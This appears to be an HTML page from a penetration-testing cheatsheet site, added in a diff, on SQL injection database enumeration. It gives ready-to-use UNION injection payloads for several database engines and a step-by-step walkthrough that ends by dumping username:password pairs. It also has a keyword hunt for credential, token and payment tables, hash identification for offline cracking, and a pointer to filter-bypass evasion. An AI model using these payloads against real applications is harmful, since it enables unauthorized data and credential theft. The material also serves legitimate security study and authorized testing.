@@ -1,0 +1,221 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQLi Database Enumeration · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>SQLi Database Enumeration</h1><p class="cx-lede">Enumerating databases, tables, columns, and data via information_schema and equivalents.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1213</span><span class="cx-tag">D3FEND D3-MH, D3-MA</span><span class="cx-tag">IMPACT DataExfil</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><p>Once you have a working UNION or other extraction primitive, walk the schema systematically: databases → tables → columns → data.</p>
+<h2 id="tldr-mysqlmariadb-4-columns-reflected">TL;DR (MySQL/MariaDB, 4 columns reflected)</h2>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- All databases
+&#x27; UNION SELECT NULL, schema_name, NULL, NULL FROM information_schema.schemata-- -
+
+-- Tables in a specific DB
+&#x27; UNION SELECT NULL, table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema=&#x27;&lt;DB&gt;&#x27;-- -
+
+-- Columns in a specific table
+&#x27; UNION SELECT NULL, column_name, table_name, NULL FROM information_schema.columns WHERE table_name=&#x27;&lt;TABLE&gt;&#x27;-- -
+
+-- Dump data
+&#x27; UNION SELECT NULL, &lt;COL1&gt;, &lt;COL2&gt;, NULL FROM &lt;DB&gt;.&lt;TABLE&gt;-- -</code></pre></figure>
+<h2 id="the-schema-metadata-interface">The schema metadata interface</h2>
+<p>Every major DBMS exposes its schema through a metadata interface. The query shape changes per engine but the workflow is identical.</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL / MariaDB</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Current database name
+SELECT database();
+
+-- All databases
+SELECT schema_name FROM information_schema.schemata;
+
+-- Tables in current DB
+SELECT table_name FROM information_schema.tables WHERE table_schema=database();
+
+-- Tables in any DB
+SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;&lt;DB&gt;&#x27;;
+
+-- Columns in a table
+SELECT column_name, data_type FROM information_schema.columns WHERE table_name=&#x27;&lt;TABLE&gt;&#x27;;
+
+-- All columns in all tables (compact)
+SELECT GROUP_CONCAT(table_name, &#x27;.&#x27;, column_name SEPARATOR &#x27;\n&#x27;)
+  FROM information_schema.columns
+  WHERE table_schema=database();</code></pre></figure>
+<p>Default schemas to ignore: <code>information_schema</code>, <code>mysql</code>, <code>performance_schema</code>, <code>sys</code>.</p>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">PostgreSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Current database
+SELECT current_database();
+
+-- All databases
+SELECT datname FROM pg_database;
+
+-- Tables in current DB
+SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;public&#x27;;
+
+-- Columns
+SELECT column_name, data_type FROM information_schema.columns WHERE table_name=&#x27;&lt;TABLE&gt;&#x27;;
+
+-- All non-system tables
+SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN (&#x27;pg_catalog&#x27;,&#x27;information_schema&#x27;);</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MSSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Current database
+SELECT DB_NAME();
+
+-- All databases
+SELECT name FROM master..sysdatabases;
+SELECT name FROM sys.databases;
+
+-- Tables
+SELECT name FROM &lt;DB&gt;..sysobjects WHERE xtype=&#x27;U&#x27;;
+SELECT TABLE_NAME FROM &lt;DB&gt;.INFORMATION_SCHEMA.TABLES;
+
+-- Columns
+SELECT name FROM &lt;DB&gt;..syscolumns WHERE id=OBJECT_ID(&#x27;&lt;DB&gt;..&lt;TABLE&gt;&#x27;);
+SELECT COLUMN_NAME FROM &lt;DB&gt;.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#x27;&lt;TABLE&gt;&#x27;;</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Current user (Oracle has no per-database concept; user owns schema)
+SELECT user FROM dual;
+
+-- All accessible tables
+SELECT table_name FROM all_tables;
+SELECT owner, table_name FROM all_tables WHERE owner NOT IN (&#x27;SYS&#x27;,&#x27;SYSTEM&#x27;,&#x27;XDB&#x27;);
+
+-- Columns
+SELECT column_name, data_type FROM all_tab_columns WHERE table_name=&#x27;&lt;TABLE&gt;&#x27;;
+
+-- Current user&#x27;s tables only
+SELECT table_name FROM user_tables;</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">SQLite</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- All tables (SQLite has no information_schema)
+SELECT name FROM sqlite_master WHERE type=&#x27;table&#x27;;
+
+-- Schema of a specific table
+SELECT sql FROM sqlite_master WHERE type=&#x27;table&#x27; AND name=&#x27;&lt;TABLE&gt;&#x27;;
+
+-- Columns via PRAGMA (only works in some contexts)
+SELECT name FROM pragma_table_info(&#x27;&lt;TABLE&gt;&#x27;);</code></pre></figure>
+</div>
+</div>
+<h2 id="workflow-in-practice">Workflow in practice</h2>
+<p>Assume an <code>id</code> parameter, MySQL, 4 columns, position 2 reflected.</p>
+<div class="cx-steps">
+<ol>
+<li><strong>Fingerprint:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27; UNION SELECT NULL,@@version,NULL,NULL-- -</code></pre></figure>
+<ol start="2">
+<li><strong>Current database:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27; UNION SELECT NULL,database(),NULL,NULL-- -
+→ &quot;appdb&quot;</code></pre></figure>
+<ol start="3">
+<li><strong>List tables in appdb:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27; UNION SELECT NULL,GROUP_CONCAT(table_name SEPARATOR &#x27;,&#x27;),NULL,NULL
+  FROM information_schema.tables WHERE table_schema=&#x27;appdb&#x27;-- -
+→ &quot;users,posts,sessions,migrations&quot;</code></pre></figure>
+<ol start="4">
+<li><strong>Get columns of users:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27; UNION SELECT NULL,GROUP_CONCAT(column_name SEPARATOR &#x27;,&#x27;),NULL,NULL
+  FROM information_schema.columns WHERE table_name=&#x27;users&#x27;-- -
+→ &quot;id,username,password,email,role,created_at&quot;</code></pre></figure>
+<ol start="5">
+<li><strong>Dump credentials:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27; UNION SELECT NULL,GROUP_CONCAT(username,&#x27;:&#x27;,password SEPARATOR &#x27;\n&#x27;),NULL,NULL
+  FROM users-- -</code></pre></figure>
+</div>
+<h2 id="identifying-high-value-tables-fast">Identifying high-value tables fast</h2>
+<p>Names worth grepping for across all tables:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>users, accounts, members, customers, employees, admins, staff
+auth, login, credentials, passwords, secrets, tokens, sessions
+config, settings, options, env
+api_keys, oauth, jwt
+payment, card, billing</code></pre></figure>
+<p>Compact hunt query (MySQL):</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT NULL,GROUP_CONCAT(table_schema,&#x27;.&#x27;,table_name SEPARATOR &#x27;\n&#x27;),NULL,NULL
+  FROM information_schema.tables
+  WHERE table_name REGEXP &#x27;user|auth|cred|pass|secret|token|admin|api_key&#x27;
+    AND table_schema NOT IN (&#x27;mysql&#x27;,&#x27;information_schema&#x27;,&#x27;performance_schema&#x27;,&#x27;sys&#x27;)-- -</code></pre></figure>
+<h2 id="hashed-passwords">Hashed passwords</h2>
+<p>Stored passwords are usually hashed. After dumping, identify the hash format:</p>
+<table>
+<thead>
+<tr>
+<th>Length</th>
+<th>Likely hash</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>32 hex</td>
+<td>MD5</td>
+</tr>
+<tr>
+<td>40 hex</td>
+<td>SHA-1</td>
+</tr>
+<tr>
+<td>64 hex</td>
+<td>SHA-256</td>
+</tr>
+<tr>
+<td>Starts with <code>$2a$</code>, <code>$2b$</code>, <code>$2y$</code></td>
+<td>bcrypt</td>
+</tr>
+<tr>
+<td>Starts with <code>$argon2</code></td>
+<td>Argon2</td>
+</tr>
+<tr>
+<td>Starts with <code>$1$</code>, <code>$5$</code>, <code>$6$</code></td>
+<td>crypt MD5/SHA-256/SHA-512</td>
+</tr>
+<tr>
+<td><code>pbkdf2_sha256$...</code></td>
+<td>Django</td>
+</tr>
+</tbody>
+</table>
+<p>Crack offline with <code>hashcat</code>. Use <code>hashcat --identify &lt;file&gt;</code> if unsure. See the credentials section of the Codex (when published) for cracking workflow.</p>
+<h2 id="limit-offset-for-large-result-sets">Limit &amp; offset for large result sets</h2>
+<p>When <code>GROUP_CONCAT</code>/<code>STRING_AGG</code> truncates or output is one row at a time:</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL / PostgreSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT NULL,username,password,NULL FROM users LIMIT 1 OFFSET 0-- -
+&#x27; UNION SELECT NULL,username,password,NULL FROM users LIMIT 1 OFFSET 1-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MSSQL (legacy)</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- No OFFSET in older versions
+&#x27; UNION SELECT TOP 1 NULL,username,password,NULL FROM users WHERE id NOT IN (SELECT TOP &lt;N&gt; id FROM users)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT NULL,username,password,NULL FROM (SELECT username,password,ROWNUM r FROM users) WHERE r=&lt;N&gt;-- -</code></pre></figure>
+</div>
+</div>
+<p>For blind enumeration where you can't see results directly, see <a href="../blind-boolean/index.html">Boolean blind</a> - same workflow, character-by-character extraction.</p>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>MySQL truncates <code>GROUP_CONCAT</code> at 1024 bytes by default. To dump more in one query:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SET SESSION group_concat_max_len = 1000000;</code></pre></figure>
+<p>This requires stacked queries (rare in MySQL). Otherwise, paginate with <code>LIMIT/OFFSET</code>.</p>
+</div>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><code>information_schema</code> queries are slower than direct table queries on large databases. If you only need a few specific tables and you can guess names, query them directly first.</li>
+<li>Some apps deny queries containing <code>information_schema</code> as a string. See <a href="../bypasses/index.html">Filter bypasses</a> for evasion (concatenation, hex encoding, comment insertion).</li>
+<li>In MySQL 8.0+, some <code>information_schema</code> views are restricted to users with appropriate privileges. If you can't enumerate tables but you know names, query them directly.</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../union-based/index.html">Previous: UNION-based SQLi</a><a class="cx-next" href="../blind-boolean/index.html">Next: Boolean-based Blind SQLi</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
